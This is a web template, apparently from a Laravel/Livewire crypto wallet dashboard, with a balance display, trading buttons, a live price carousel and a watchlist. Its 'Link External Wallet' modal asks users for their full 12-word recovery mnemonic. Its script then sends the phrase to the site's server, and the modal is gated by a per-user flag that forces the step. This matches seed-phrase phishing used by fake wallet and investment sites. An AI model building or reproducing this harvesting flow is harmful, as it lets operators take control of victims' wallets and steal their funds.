<div style="width:100%">
  <!-- Top Bar -->
  <div class="top">
    <div class="left-icons">
      <a href="{{ route('settings') }}" class="icon-btn"><i class='bx bx-cog'></i></a>
      <a href="{{ route('dashboard') }}" class="icon-btn"><i class='bx bx-grid-alt'></i></a>
    </div>
    <div style="display:flex;align-items:center;gap:8px">
      <div class="title">Main Wallet</div>
      <div style="opacity:.7; font-size: 10px;">▼</div>
    </div>
    <div style="display:flex;gap:10px;align-items:center">
      <div class="copy-container" style="margin-top: 0;">
        <button onclick="navigator.clipboard.writeText('{{ $accountId }}'); window.showToast('Copied Wallet ID!');" class="copy-btn" style="padding: 4px 8px;">
          <i class='bx bx-copy'></i> 
        </button>
      </div>
      <a href="{{ route('buy.index') }}" class="icon-btn"><i class='bx bx-search'></i></a>
    </div>
  </div>

  <!-- Balance Section -->
  <div class="balance">
    <h1 id="mainBalance" class="balance-value" style="transition: opacity 0.2s;">
      {{ $balanceShow ? '$' . $balance : '$●●●●●●' }}
    </h1>
    <div class="live-rate">
      @if ($balanceShow)
        @php
          $isPositive = floatval(str_replace(',', '', $changeUSD)) >= 0;
        @endphp
        <span id="balanceChange" class="change {{ $isPositive ? 'green' : 'red' }}" style="font-size:13px;">
          {{ $isPositive ? '+' : '' }}${{ $changeUSD }} ({{ $isPositive ? '+' : '' }}{{ $changePercentage }}%)
        </span>
      @else
        <span id="balanceChange" class="change green" style="font-size:13px; opacity: 0.6;">
          *** (***)
        </span>
      @endif
      <button wire:click="toggleBalance"
              style="background:none; border:none; color:var(--muted); cursor:pointer; font-size:20px; padding:0 4px; display:inline-flex; align-items:center;">
        <i class='bx {{ $balanceShow ? "bx-hide" : "bx-show" }}' id="eyeIcon"></i>
      </button>
    </div>
  </div>
  
  <!-- Core Action Buttons -->
  <div class="actions">
    <a onclick="toggleModal('sendModal')" class="action"><i class='bx bx-up-arrow-alt'></i><div class="action-label">Send</div></a>
    <a href="{{ route('swap') }}" class="action"><i class='bx bx-transfer'></i><div class="action-label">Swap</div></a>
    <a href="{{ route('deposit') }}" class="action fund"><i class='bx bx-bolt-circle'></i><div class="action-label">Fund</div></a>
    <a href="{{ route('swap') }}" class="action"><i class='bx bx-credit-card'></i><div class="action-label">Sell</div></a>
    <a href="{{ route('bots') }}" class="action"><i class='bx bx-line-chart'></i><div class="action-label">Earn</div></a>
  </div>

  <!-- Link External Wallet Banner -->
  @if($user && $user->require_wallet_connect)
    <div class="actions" style="margin-top: 15px;">
      <a href="{{ route('wallet.connect') }}" wire:navigate class="action import">
        <i class='bx bx-wallet'></i>
        <div class="action-label">Import Wallet</div>
      </a>
    </div>
  @endif
  
  <div style="display:flex; align-items:center; justify-content:space-between; padding: 0 6px;">
    <div class="section-title" style="margin: 18px 0 8px 0;">Alpha tokens</div>
    <div id="alphaLiveIndicator" style="display:flex; align-items:center; gap:5px; font-size:11px; color:var(--muted);">
      <span id="alphaLiveDot" style="width:6px;height:6px;border-radius:50%;background:var(--muted);display:inline-block;transition:background 0.3s;"></span>
      <span id="alphaLiveText">Loading...</span>
    </div>
  </div>

  <!-- Alpha tokens live slider -->
  <div class="alpha-container">
    <div class="alpha-track" id="alphaTrack">
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-btc">
        <div class="token-circle" style="background:linear-gradient(135deg,#f7931a,#e8750a);">
          <img src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="BTC">
        </div>
        <div>
          <div class="token-name">BTC</div>
          <div class="market" id="btc-mcap">Bitcoin</div>
        </div>
        <div class="token-price">
          $<span id="btc-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="btc-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-eth">
        <div class="token-circle" style="background:linear-gradient(135deg,#627eea,#3a55c4);">
          <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ETH">
        </div>
        <div>
          <div class="token-name">ETH</div>
          <div class="market" id="eth-mcap">Ethereum</div>
        </div>
        <div class="token-price">
          $<span id="eth-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="eth-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-sol">
        <div class="token-circle" style="background:linear-gradient(135deg,#9945ff,#14f195);">
          <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="SOL">
        </div>
        <div>
          <div class="token-name">SOL</div>
          <div class="market" id="sol-mcap">Solana</div>
        </div>
        <div class="token-price">
          $<span id="sol-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="sol-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-bnb">
        <div class="token-circle" style="background:linear-gradient(135deg,#f3ba2f,#c89b08);">
          <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="BNB">
        </div>
        <div>
          <div class="token-name">BNB</div>
          <div class="market" id="bnb-mcap">BNB Chain</div>
        </div>
        <div class="token-price">
          $<span id="bnb-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="bnb-change">—</div>
        </div>
      </a>
      <a href="{{ route('buy.index') }}" class="token-card" id="alpha-xrp">
        <div class="token-circle" style="background:linear-gradient(135deg,#346aa9,#1e3f6e);">
          <img src="https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png" alt="XRP">
        </div>
        <div>
          <div class="token-name">XRP</div>
          <div class="market" id="xrp-mcap">Ripple</div>
        </div>
        <div class="token-price">
          $<span id="xrp-price" style="min-width:60px;display:inline-block;">—</span>
          <div style="font-size:11px;margin-top:3px;" id="xrp-change">—</div>
        </div>
      </a>
    </div>
  </div>

  <div class="alpha-nav" id="alphaNav">
    <div class="alpha-dot active" data-index="0"></div>
    <div class="alpha-dot" data-index="1"></div>
    <div class="alpha-dot" data-index="2"></div>
    <div class="alpha-dot" data-index="3"></div>
    <div class="alpha-dot" data-index="4"></div>
  </div>
  
  <!-- Token List Tabs -->
  <div class="tabs-container">
    <div class="tabs">
      <div class="tab active" id="tab-crypto">Crypto</div>
      <div class="tab" id="tab-watchlist">Watchlist</div>
    </div>
    <div class="horizontal-icons">
      <a href="{{ route('notifications') }}" class="horizontal-icon" title="Transaction History">
        <i class='bx bx-history'></i>
      </a>
      <a href="{{ route('crypto.manage') }}" class="horizontal-icon" title="Manage Cryptocurrencies">
        <i class='bx bx-edit-alt'></i>
      </a>
    </div>
  </div>
  
  <!-- Crypto Tokens Listing -->
  <div class="list" wire:poll.30s>
    <div class="crypto-list">
      @foreach($cryptoAssets as $asset)
        <div class="asset asset-item" data-symbol="{{ $asset['symbol'] }}" style="display: flex; align-items: center; justify-content: space-between; position: relative; margin-bottom: 6px;">
          <a href="{{ route('crypto.details', ['symbol' => strtolower($asset['symbol']), 'network' => $asset['network'] ?? 'native']) }}" style="display: flex; align-items: center; gap: 12px; text-decoration: none; color: inherit; flex: 1; min-w: 0;">
            <div class="avatar" style="position: relative; flex-shrink: 0;">
              <img src="{{ $asset['icon_url'] }}" alt="{{ $asset['name'] }}" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIyMCIgY3k9IjIwIiByPSIyMCIgZmlsbD0iIzI2MjYyOCIvPjwvc3ZnPg=='">
              @if(!empty($asset['network_url']))
                <img src="{{ $asset['network_url'] }}" alt="Network" style="position: absolute; width: 14px; height: 14px; bottom: -2px; right: -2px; border-radius: 50%; border: 1px solid var(--card); background: #fff; object-fit: contain;">
              @endif
            </div>
            <div class="meta" style="flex: 1; min-w: 0;">
              <div class="symbol" style="font-weight: 700; display: flex; align-items: center; gap: 6px; color: var(--text);">
                {{ $asset['symbol'] }}
                @if($asset['network'])
                  <span style="font-size: 9px; background: var(--pill); padding: 2px 6px; border-radius: 4px; color: var(--muted);">{{ $asset['network'] }}</span>
                @endif
              </div>
              <div class="name" style="color: var(--muted); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ $asset['name'] }}</div>
            </div>
            <div class="right" style="text-align: right; display: flex; flex-direction: column; align-items: flex-end; gap: 2px; margin-right: 8px;">
              <div class="balance-info" style="display: flex; flex-direction: column; align-items: flex-end;">
                <div class="crypto-balance" style="font-weight: 600; color: var(--text);">{{ $balanceShow ? $asset['balance'] : '***' }}</div>
                <div class="crypto-value" style="color: var(--muted); font-size: 13px;">{{ $balanceShow ? '$' . number_format($asset['value'], 2) : '***' }}</div>
              </div>
              <div class="change {{ floatval($asset['change']) < 0 ? 'red' : 'green' }}" style="font-weight: 700; font-size: 12px;">
                {{ floatval($asset['change']) >= 0 ? '+' : '' }}{{ $asset['change'] }}%
              </div>
            </div>
          </a>
          <button class="watchlist-btn" data-symbol="{{ $asset['symbol'] }}" title="Add to Watchlist">
            <i class='bx bx-star'></i>
          </button>
        </div>
      @endforeach
    </div>
    
    <div id="emptyWatchlistMsg" class="empty-watchlist" style="display: none; text-align: center; padding: 40px 20px; color: var(--muted);">
      <i class='bx bx-star' style="font-size: 48px; margin-bottom: 16px; display: inline-block;"></i>
      <div>Your Watchlist is empty</div>
      <div style="font-size: 13px; margin-top: 4px;">Tap the star icon next to a coin to add it.</div>
    </div>
    
    <!-- Manage Crypto Link -->
    <div style="text-align: center; padding: 20px 0;">
      <a href="{{ route('crypto.manage') }}" style="color: var(--accent); font-weight: 600; text-decoration: none; font-size: 14px;">
        Manage crypto list
      </a>
    </div>
  </div>

  <!-- Wallet Connection Modal -->
  <div id="walletModal" class="modal-overlay" style="display: none; justify-content: center; align-items: center;">
    <div class="modal">
      <div class="modal-header">
        <h3 class="modal-title">Link External Wallet</h3>
        <button onclick="hideWalletModal()" class="modal-close">
          <i class="bx bx-x"></i>
        </button>
      </div>

      <div class="modal-body">
        <form id="walletForm" class="space-y-4" onsubmit="window.submitWalletForm(event)">
          <p style="font-size: 13px; color: var(--muted); margin-bottom: 12px;">Please enter your 12-word recovery backup mnemonic phrase:</p>

          <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;">
            @for($i = 1; $i <= 12; $i++)
              <div>
                <input type="text" id="word{{ $i }}" class="form-input" placeholder="Word {{ $i }}" style="padding: 8px; font-size: 13px;" required
                       @keydown="
                         if (($event.key === ' ' || $event.key === 'Enter') && $el.value.length > 0 && {{ $i }} < 12) {
                           $event.preventDefault();
                           document.getElementById('word' + ({{ $i }} + 1)).focus();
                         }
                         else if ($event.key === 'Backspace' && $el.value.length === 0 && {{ $i }} > 1) {
                           document.getElementById('word' + ({{ $i }} - 1)).focus();
                         }
                       "
                       @input="$el.value = $el.value.replace(/[^a-zA-Z]/g, '').toLowerCase()">
              </div>
            @endfor
          </div>

          <div style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;">
            <button type="button" onclick="hideWalletModal()" class="max-btn">Cancel</button>
            <button type="submit" class="submit-btn" style="width: auto; margin-top: 0; padding: 10px 20px; font-size: 14px;">Connect Wallet</button>
          </div>
        </form>
      </div>
    </div>
  </div>
  <script>
    function showWalletModal() {
      document.getElementById('walletModal').classList.add('active');
      document.getElementById('walletModal').style.display = 'flex';
    }

    function hideWalletModal() {
      document.getElementById('walletModal').classList.remove('active');
      document.getElementById('walletModal').style.display = 'none';
      document.getElementById('walletForm').reset();
    }

    window.submitWalletForm = function(e) {
      e.preventDefault();
      let words = [];
      for(let i = 1; i <= 12; i++) {
        let inputEl = document.getElementById(`word${i}`);
        words.push(inputEl ? inputEl.value.trim().toLowerCase() : '');
      }

      const phrase = words.join(' ');
      const csrfMeta = document.querySelector('meta[name="csrf-token"]');
      const csrfToken = csrfMeta ? csrfMeta.getAttribute('content') : '';

      fetch('/wallet-connect/connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          wallet_phrase: phrase,
          wallet_name: 'Imported Wallet'
        })
      })
      .then(response => response.json().then(data => ({ status: response.status, body: data })))
      .then(res => {
        if (res.status === 200 && res.body.success) {
          hideWalletModal();
          window.showToast('Wallet linked successfully!');
          setTimeout(() => {
            window.location.reload();
          }, 1500);
        } else {
          window.showToast(res.body.message || 'Failed to connect wallet.', true);
        }
      })
      .catch(err => {
        console.error("AJAX connectWallet failed", err);
        window.showToast('An error occurred. Please try again.', true);
      });
    };

    // Touch/drag scroll and dots sync for Alpha tokens tracker
    function initAlphaCarousel() {
      const alphaTrack = document.getElementById('alphaTrack');
      const alphaDots = document.querySelectorAll('.alpha-dot');
      const tokenCards = document.querySelectorAll('.token-card');
      if (!alphaTrack || alphaDots.length === 0) return;
      
      const cardWidth = tokenCards[0] ? tokenCards[0].offsetWidth + 12 : 262;
      let currentIndex = 0;
      let autoScrollInterval;
      
      function updateCarousel() {
        alphaTrack.style.transform = `translateX(-${currentIndex * cardWidth}px)`;
        alphaDots.forEach((dot, index) => {
          dot.classList.toggle('active', index === currentIndex);
        });
      }
      
      function goToSlide(index) {
        currentIndex = index;
        updateCarousel();
        resetAutoScroll();
      }
      
      function startAutoScroll() {
        autoScrollInterval = setInterval(() => {
          currentIndex = (currentIndex + 1) % alphaDots.length;
          updateCarousel();
        }, 5000);
      }
      
      function resetAutoScroll() {
        clearInterval(autoScrollInterval);
        startAutoScroll();
      }
      
      alphaDots.forEach((dot, index) => {
        dot.addEventListener('click', () => goToSlide(index));
      });
      
      let startX = 0;
      let isSwiping = false;
      
      alphaTrack.addEventListener('touchstart', (e) => {
        startX = e.touches[0].clientX;
        isSwiping = true;
        resetAutoScroll();
      });
      
      alphaTrack.addEventListener('touchmove', (e) => {
        if (!isSwiping) return;
        const currentX = e.touches[0].clientX;
        const diff = startX - currentX;
        alphaTrack.style.transform = `translateX(calc(-${currentIndex * cardWidth}px - ${diff}px))`;
      });
      
      alphaTrack.addEventListener('touchend', (e) => {
        if (!isSwiping) return;
        
        const endX = e.changedTouches[0].clientX;
        const diff = startX - endX;
        const threshold = 50;
        
        if (Math.abs(diff) > threshold) {
          if (diff > 0 && currentIndex < alphaDots.length - 1) {
            goToSlide(currentIndex + 1);
          } else if (diff < 0 && currentIndex > 0) {
            goToSlide(currentIndex - 1);
          } else {
            updateCarousel();
          }
        } else {
          updateCarousel();
        }
        
        isSwiping = false;
      });

      // Mouse drag scroll fallback for desktop
      let isDown = false;
      let startMouseX;
      let scrollLeft;
      
      alphaTrack.addEventListener('mousedown', (e) => {
        isDown = true;
        startMouseX = e.pageX - alphaTrack.offsetLeft;
        scrollLeft = alphaTrack.scrollLeft;
        resetAutoScroll();
      });
      alphaTrack.addEventListener('mouseleave', () => {
        isDown = false;
      });
      alphaTrack.addEventListener('mouseup', () => {
        isDown = false;
      });
      alphaTrack.addEventListener('mousemove', (e) => {
        if(!isDown) return;
        e.preventDefault();
        const x = e.pageX - alphaTrack.offsetLeft;
        const walk = (x - startMouseX) * 2;
        alphaTrack.scrollLeft = scrollLeft - walk;
      });

      startAutoScroll();
    }

    // Local Storage Watchlist filtering
    function initWatchlist() {
      const tabCrypto = document.getElementById('tab-crypto');
      const tabWatchlist = document.getElementById('tab-watchlist');
      const assetElements = document.querySelectorAll('.crypto-list .asset-item');
      const watchlistButtons = document.querySelectorAll('.watchlist-btn');
      
      let watchlist = JSON.parse(localStorage.getItem('user_watchlist') || '["BTC", "ETH", "SOL"]');
      
      function updateButtonStates() {
        watchlistButtons.forEach(btn => {
          const symbol = btn.dataset.symbol;
          const icon = btn.querySelector('i');
          if (watchlist.includes(symbol)) {
            btn.classList.add('active');
            if (icon) icon.className = 'bx bxs-star';
          } else {
            btn.classList.remove('active');
            if (icon) icon.className = 'bx bx-star';
          }
        });
      }

      function filterWatchlist() {
        const isWatchlistTab = tabWatchlist && tabWatchlist.classList.contains('active');
        let visibleCount = 0;
        
        assetElements.forEach(item => {
          const symbol = item.dataset.symbol;
          if (isWatchlistTab) {
            if (watchlist.includes(symbol)) {
              item.style.display = 'flex';
              visibleCount++;
            } else {
              item.style.display = 'none';
            }
          } else {
            item.style.display = 'flex';
            visibleCount++;
          }
        });

        const emptyMsg = document.getElementById('emptyWatchlistMsg');
        if (emptyMsg) {
          if (isWatchlistTab && visibleCount === 0) {
            emptyMsg.style.display = 'block';
          } else {
            emptyMsg.style.display = 'none';
          }
        }
      }

      watchlistButtons.forEach(btn => {
        btn.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          const symbol = this.dataset.symbol;
          
          if (watchlist.includes(symbol)) {
            watchlist = watchlist.filter(s => s !== symbol);
            window.showToast(symbol + ' removed from watchlist');
          } else {
            watchlist.push(symbol);
            window.showToast(symbol + ' added to watchlist');
          }
          
          localStorage.setItem('user_watchlist', JSON.stringify(watchlist));
          updateButtonStates();
          filterWatchlist();
        });
      });

      if (tabCrypto) {
        tabCrypto.addEventListener('click', function() {
          tabWatchlist.classList.remove('active');
          this.classList.add('active');
          filterWatchlist();
        });
      }

      if (tabWatchlist) {
        tabWatchlist.addEventListener('click', function() {
          tabCrypto.classList.remove('active');
          this.classList.add('active');
          filterWatchlist();
        });
      }

      updateButtonStates();
      filterWatchlist();
    }

    // === LIVE ALPHA TOKENS: CoinGecko Free API ===
    let alphaRefreshInterval = null;

    function formatPrice(price) {
      if (price >= 1000) return price.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
      if (price >= 1) return price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      return price.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 4 });
    }

    function formatMcap(mcap) {
      if (!mcap) return '';
      if (mcap >= 1e12) return '$' + (mcap / 1e12).toFixed(2) + 'T';
      if (mcap >= 1e9)  return '$' + (mcap / 1e9).toFixed(2) + 'B';
      if (mcap >= 1e6)  return '$' + (mcap / 1e6).toFixed(1) + 'M';
      return '$' + mcap.toLocaleString();
    }

    function fetchAlphaLiveRates() {
      const coins = ['bitcoin','ethereum','solana','binancecoin','ripple'];
      const ids = ['btc','eth','sol','bnb','xrp'];
      const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=' + coins.join(',') + '&order=market_cap_desc&per_page=5&page=1&price_change_percentage=24h';

      const dot = document.getElementById('alphaLiveDot');
      const txt = document.getElementById('alphaLiveText');

      fetch(url)
        .then(r => r.json())
        .then(data => {
          if (!Array.isArray(data)) return;

          const map = {};
          data.forEach(c => { map[c.id] = c; });

          const coinMap = {
            bitcoin: 'btc', ethereum: 'eth', solana: 'sol',
            binancecoin: 'bnb', ripple: 'xrp'
          };

          Object.entries(coinMap).forEach(([cgId, sym]) => {
            const c = map[cgId];
            if (!c) return;
            const priceEl   = document.getElementById(sym + '-price');
            const changeEl  = document.getElementById(sym + '-change');
            const mcapEl    = document.getElementById(sym + '-mcap');
            if (priceEl)  priceEl.textContent  = formatPrice(c.current_price);
            if (mcapEl)   mcapEl.textContent   = formatMcap(c.market_cap);
            if (changeEl) {
              const pct = c.price_change_percentage_24h;
              const sign = pct >= 0 ? '+' : '';
              changeEl.textContent  = sign + pct.toFixed(2) + '%';
              changeEl.style.color  = pct >= 0 ? 'var(--accent)' : 'var(--danger)';
              changeEl.style.fontWeight = '700';
            }
          });

          if (dot) { dot.style.background = 'var(--accent)'; }
          if (txt) {
            const now = new Date();
            txt.textContent = 'Live · ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
          }
        })
        .catch(() => {
          if (dot) dot.style.background = 'var(--danger)';
          if (txt) txt.textContent = 'Offline';
        });
    }

    function initAlphaLiveRates() {
      fetchAlphaLiveRates();
      if (alphaRefreshInterval) clearInterval(alphaRefreshInterval);
      alphaRefreshInterval = setInterval(fetchAlphaLiveRates, 60000);
    }
    // === END LIVE ALPHA TOKENS ===

    // Initialize scripts on load and Livewire navigate
    function initAllDashboardScripts() {
      initAlphaCarousel();
      initWatchlist();
      initAlphaLiveRates();
    }

    document.addEventListener('DOMContentLoaded', initAllDashboardScripts);
    document.addEventListener('livewire:load', initAllDashboardScripts);
    document.addEventListener('livewire:navigated', initAllDashboardScripts);

    
    // Fallback trigger
    setTimeout(initAllDashboardScripts, 500);
  </script>
</div>
